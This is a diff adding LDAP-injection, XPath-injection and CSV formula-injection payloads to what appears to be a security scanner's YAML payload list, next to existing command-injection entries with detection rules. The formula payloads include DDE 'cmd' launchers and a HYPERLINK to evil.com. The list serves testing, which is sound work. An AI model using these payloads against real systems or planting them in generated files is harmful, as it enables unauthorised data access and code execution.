@@ -76,3 +76,25 @@ cmdi_payloads:
     detect: "root"
   - value: "; sleep 5"
     detect: "delay_gt_4000ms"
+
+ldap_payloads:
+  - value: "*)"
+  - value: "*)(uid=*))(|(uid=*"
+  - value: "admin)(&)"
+  - value: "\\2a)(uid=\\2a"
+  - value: ")(|(password=*))"
+  - value: "*)(objectClass=*"
+
+xpath_payloads:
+  - value: "' or '1'='1"
+  - value: "') or ('1'='1"
+  - value: "x' or 1=1 or 'x'='y"
+  - value: "' or ''='"
+  - value: "1' or '1'='1"
+
+csv_payloads:
+  - value: "=cmd|'/C calc'!A0"
+  - value: "=HYPERLINK(\"http://evil.com\",\"click\")"
+  - value: "+cmd|'/C calc'!A0"
+  - value: "-2+3+cmd|'/C calc'!A0"
+  - value: "@SUM(1+9)*cmd|'/C calc'!A0"
